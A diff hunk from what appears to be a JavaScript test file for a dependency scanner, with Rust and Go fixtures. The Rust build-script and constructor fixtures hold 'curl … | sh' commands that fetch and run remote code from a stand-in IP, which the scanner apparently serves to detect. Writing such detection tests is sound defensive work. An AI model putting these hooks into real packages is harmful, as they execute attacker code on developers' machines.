@@ -24,7 +24,7 @@ const BUILD_RS = 'use std::process::Command;\n\nfn main() {\n    let url = forma
   '    Command::new("sh").arg("-c").arg(format!("curl -s {} | sh", url)).status().ok();\n}\n';
 const CTOR_RS = '#[ctor::ctor]\nfn init() {\n    std::process::Command::new("sh").arg("-c").arg("curl -s https://203.0.113.9/s | sh").spawn().ok();\n}\n\npub fn f() {}\n';
 const CLEAN_RS = "pub fn add(a: u32, b: u32) -> u32 { a + b }\n";
-const BLOB = "Zm9v".repeat(80);
+const BLOB = Buffer.from(Array.from({ length: 240 }, (_, i) => (i * 7919) % 256)).toString("base64");   // (G-5: real base64)
 const MODULES_TXT = "# example.test/evil v1.0.0\n## explicit; go 1.21\nexample.test/evil\n" +
   "# example.test/ok v1.2.0\n## explicit\nexample.test/ok/sub\n";
 const GO_PROJECT = { "go.mod": "module example.test/app\n\ngo 1.21\n", "main.go": "package main\n\nfunc main() {}\n",
